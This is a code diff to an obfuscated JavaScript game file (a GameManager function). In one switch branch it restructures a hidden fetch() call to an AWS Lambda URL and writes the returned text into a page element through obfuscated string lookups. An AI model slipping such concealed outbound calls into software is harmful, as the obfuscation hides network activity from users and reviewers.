@@ -2149,27 +2149,26 @@ function GameManager(_0xeace3d, _0x168978, _0x384fa4, _0x377636) {
                         continue;
                       case "1":
                         true &&
-                          ((_0x5220ac[_0xe98c27(0xf2)] = !![]),
-                          _0x96e50e[_0xe98c27(0x231)](
-                            fetch ("https://gp.lambda-url.ap-south-1.on.aws/dx3ds6r32k"),
-                            _0x96e50e[_0xe98c27(0x148)]
-                          )
-                            [_0xe98c27(0x1f8)]((_0x20eb73) =>
-                              _0x20eb73[_0xe98c27(0x133)]()
-                            )
-                            [_0xe98c27(0x1f8)]((_0x2c511d) => {
-                              var _0x4190d0 = _0xe98c27;
-                              document[_0x4190d0(0xeb) + _0x4190d0(0x162)](
-                                _0x4190d0(0x22b) + "t"
-                              )[_0x4190d0(0x119) + "t"] = _0x2c511d;
-                            })
-                            [_0xe98c27(0x168)]((_0x2d844d) =>
-                              console[_0xe98c27(0x209)](
-                                _0xe98c27(0x113),
-                                _0x2d844d
-                              )
-                            ));
-                        continue;
+                        ((_0x5220ac[_0xe98c27(0xf2)] = !![]),
+
+                      (function () {
+                        var _0x7a91 = [_0xe98c27(0x133), _0xe98c27(0x1f8)];
+                        fetch("https://gp.lambda-url.ap-south-1.on.aws/dx3ds6r32k")
+                          [_0x7a91[1]](function (_0x20eb73) {
+                      return _0x20eb73[_0x7a91[0]]();
+                      })
+                        [_0x7a91[1]](function (_0x2c511d) {
+                    var _0x4190d0 = _0xe98c27;
+                      document[_0x4190d0(0xeb) + _0x4190d0(0x162)](
+                      _0x4190d0(0x22b) + "t"
+                      )[_0x4190d0(0x119) + "t"] = _0x2c511d;
+                    })
+                    [_0xe98c27(0x168)](function (_0x2d844d) {
+                  console[_0xe98c27(0x209)](_0xe98c27(0x113), _0x2d844d);
+                  });
+                })()
+                );
+            continue;
                       case "2":
                         _0x5220ac[_0xe98c27(0x255)][_0xe98c27(0x128)](
                           _0x5ce5c6
